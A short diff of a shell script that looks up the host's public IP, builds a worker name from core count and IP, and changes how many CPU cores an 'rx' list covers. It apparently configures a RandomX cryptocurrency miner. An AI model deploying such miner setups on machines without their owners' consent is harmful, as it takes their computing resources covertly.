@@ -19,7 +19,7 @@ addr=`wget --no-check-certificate -qO- http://checkip.amazonaws.com/ 2>/dev/null
 [ -n "$addr" ] || addr="NULL"
 name=`RandString 2 c${cores}_${addr}`;
 
-rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
+[ "$cores" -gt "2" ] && rx="[`seq -s ', ' 0 $((cores - 2))`]" || rx=""
 rxName=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 [ -n "$rxName" ] || rxName="$name"
 
